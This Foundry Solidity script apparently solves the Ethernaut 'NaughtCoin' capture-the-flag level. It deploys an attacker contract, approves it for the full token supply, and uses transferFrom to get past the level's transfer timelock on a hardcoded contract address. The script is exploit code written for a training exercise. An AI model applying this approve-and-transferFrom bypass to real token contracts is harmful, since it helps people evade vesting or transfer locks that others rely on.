// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../levels/15-NaughtCoin.sol";
import "../src/15-NaughtCoin.sol";
import "forge-std/Script.sol";

contract Attack is Script {
    NaughtCoin naughtCoin = NaughtCoin(0xcEdA057f4F51229dCB7e89354f85281401C76505);

    function run() external{
        vm.startBroadcast();
        
        // Create intermediary contract
        NaughtCoinAttacker attacker = new NaughtCoinAttacker(0xcEdA057f4F51229dCB7e89354f85281401C76505);

        // Approve attacker to transfer funds on player's behalf
        naughtCoin.approve(address(attacker), naughtCoin.INITIAL_SUPPLY());

        // Call function to transfer tokens from player to attacker
        attacker.attack();

        vm.stopBroadcast();
    }
}